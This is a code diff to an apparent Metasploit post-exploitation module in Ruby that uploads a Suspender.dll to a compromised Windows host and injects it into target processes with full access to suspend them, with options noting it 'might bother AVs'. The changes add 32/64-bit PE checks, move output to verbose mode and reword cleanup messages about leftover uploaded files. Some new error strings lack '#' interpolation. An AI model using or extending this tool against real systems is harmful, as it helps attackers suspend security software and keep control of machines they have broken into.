@@ -62,9 +62,9 @@ class Metasploit3 < Msf::Post
 				OptBool.new('USE_DLL', [true,
 					'Do NOT use Suspender.dll, this method might bother AVs',true]),
 				@@suspender32 = OptPath.new('SUSPENDER_DLL', [false,
-					"Local path to the 32-bit Suspender.dll, req'd if USE_DLL is true", nil]),
+					"Local path to the 32-bit Suspender.dll, req'd if USE_DLL", nil]),
 				@@suspender64 = OptPath.new('SUSPENDER_DLL64', [false,
-					"Local path to the 64-bit dll, req'd if USE_DLL and target OS is 64-bit", nil]),
+					"Local path to the 64-bit dll, req'd if USE_DLL & 64-bit OS", nil]),
 				OptBool.new('HALT', [true, 'Halt further suspension if any failure is encountered',
 					false])
 			], self.class)
@@ -93,13 +93,25 @@ class Metasploit3 < Msf::Post
 			# we need 32-bit suspender.dll to be there regardless of target OS arch as
 			# processes on a 64-bit OS may be either 32 or 64
 			suspenders = {}
-			if @@suspender32.valid?(datastore['SUSPENDER_DLL'])
-				# TODO:  confirm dll's arch
-				suspenders[32] = datastore['SUSPENDER_DLL']
-			else
+			# check if datastore entry is valid & 32bit
+			if (datastore['SUSPENDER_DLL'] and @@suspender32.valid?(datastore['SUSPENDER_DLL']))
+				if get_pe_arch(datastore['SUSPENDER_DLL']) == 32
+					# then let's use it
+					suspenders[32] = datastore['SUSPENDER_DLL']
+				else
+					print_error("{datastore['SUSPENDER_DLL']} is not a 32-bit dll, naughty boy")
+					raise Rex::Script::Completed
+				end
+			else # check if the default location has a valid 32-bit dll
 				susp_path = ::File.join(Msf::Config.data_directory,'suspender','x86','Suspender.dll')
 				if @@suspender32.valid?(susp_path)
-					suspenders[32] = susp_path
+					if get_pe_arch(susp_path) == 32
+						# then let's use it
+						suspenders[32] = susp_path
+					else
+						print_error("{susp_path} is not a 32-bit dll")
+						raise Rex::Script::Completed
+					end
 				else
 					raise OptionValidateError.new('SUSPENDER_DLL'),
 					"Could not find 32-bit Suspender.dll.  " +
@@ -108,13 +120,25 @@ class Metasploit3 < Msf::Post
 			end
 			# we don't need to validate 64-bit suspender.dll if target OS isn't 64-bit
 			if sysinfo['Architecture'] =~ /64/
-				if @@suspender64.valid?(datastore['SUSPENDER_DLL64'])
-					# TODO:  confirm dll's arch
-					suspenders[64] = datastore['SUSPENDER_DLL64']
-				else
+				# check if datastore entry is valid & 64bit
+				if (datastore['SUSPENDER_DLL64'] and @@suspender64.valid?(datastore['SUSPENDER_DLL64']))
+					if get_pe_arch(datastore['SUSPENDER_DLL64']) == 64
+						# then let's use it
+						suspenders[64] = datastore['SUSPENDER_DLL64']
+					else
+						print_error("{datastore['SUSPENDER_DLL64']} is not a 64-bit dll")
+						raise Rex::Script::Completed
+					end
+				else # check if the default location has a valid 64-bit dll
 					susp_path = ::File.join(Msf::Config.data_directory,'suspender','x64','Suspender.dll')
 					if @@suspender64.valid?(susp_path)
-						suspender[64] = susp_path
+						if get_pe_arch(susp_path) == 64
+							# then let's use it
+							suspenders[64] = susp_path
+						else
+							print_error("{susp_path} is not a 64-bit dll")
+							raise Rex::Script::Completed
+						end
 					else
 						raise OptionValidateError.new('SUSPENDER_DLL64'),
 						"Could not find 64-bit Suspender.dll.  " +
@@ -237,7 +261,7 @@ class Metasploit3 < Msf::Post
 			print_error "Halting.  (set HALT false to change this behavior)"
 			raise Rex::Script::Completed
 		else
-			print_status "Continuing..."
+			vprint_status "Continuing..."
 		end
 	end
 
@@ -298,12 +322,11 @@ class Metasploit3 < Msf::Post
 		end
 		begin
 			# Upload suspender(s) to target
-			print_status "Uploading Suspender payload(s) to:"
+			vprint_status "Uploading Suspender payload(s) to:"
 			uploads.each_value do |path|
 				print_line "\t#{path}"
 			end
-			print_status "you'll have to remove the file(s) manually as they will be in use until" + 
-			" the suspended process is killed, but I'll try to remove them anyways"
+			vprint_status "You may have to delete these files yourself"
 			uploads.each_pair do |arch,pay|
 				session.fs.file.upload_file("#{pay}", "#{suspenders[arch]}")
 			end
@@ -317,7 +340,8 @@ class Metasploit3 < Msf::Post
 		proc = nil
 		pids.each_pair do |pid,arch|
 			begin
-				print_status("Targeting the #{arch.to_s}-bit process with PID=#{pid} using #{suspenders[arch]}...")
+				vprint_status("Targeting the #{arch.to_s}-bit process with " +
+								"PID=#{pid} using #{suspenders[arch]}...")
 				raw = ploads[arch]
 				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
 				mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
@@ -334,11 +358,10 @@ class Metasploit3 < Msf::Post
 			end
 		end
 		# Attempt clean up
-		print_status("Cleaning up what I can, but you'll likely have to delete:")
+		print_status("Attempting to delete:")
 		uploads.each_value do |up|
 			print_line "\t#{up}"
 		end
-		print_line "\tafter you kill the suspended process(es)"
 		# in most situations these attempts won't work so we eat the errors raised
 		some_files_could_not_be_removed = false
 		uploads.each_value do |up|
@@ -358,7 +381,25 @@ class Metasploit3 < Msf::Post
 				end
 			end
 		end
-		print_status "Could not remove some uploaded files as expected" if some_files_could_not_be_removed
+		msg = "Could not remove some uploaded files as expected, you'll have to " + 
+				"remove them after you release/kill the suspended process(es)"
+		if some_files_could_not_be_removed
+			print_status(msg)
+		else
+			print_good "Successfuly deleted all uploads"
+		end
+	end
+
+	def get_pe_arch(pe_file)
+		# returns int, either 32 or 64, or nil if unknown
+		pe = Rex::PeParsey::Pe.new_from_file(pe_file)
+		if pe.ptr_32?
+			return 32
+		elsif pe.ptr_64?
+			return 64
+		else
+			return nil
+		end
 	end
 
 end
